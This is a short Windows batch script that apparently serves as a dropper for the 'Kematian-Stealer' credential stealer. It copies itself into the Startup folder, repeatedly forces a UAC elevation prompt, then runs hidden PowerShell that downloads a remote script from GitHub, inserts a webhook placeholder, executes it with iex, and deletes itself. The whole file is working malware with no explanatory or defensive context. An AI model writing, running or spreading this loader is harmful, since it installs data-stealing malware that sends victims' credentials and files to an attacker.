@echo off
cd /d "%~dp0"
copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\fr.bat" >nul 2>&1
net session >nul 2>&1
if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "while($true){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\fr.bat" >nul 2>&1
(goto) 2>nul & start powershell -windowStyle hidden -c "$ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | iex" & del /f /q "%~f0"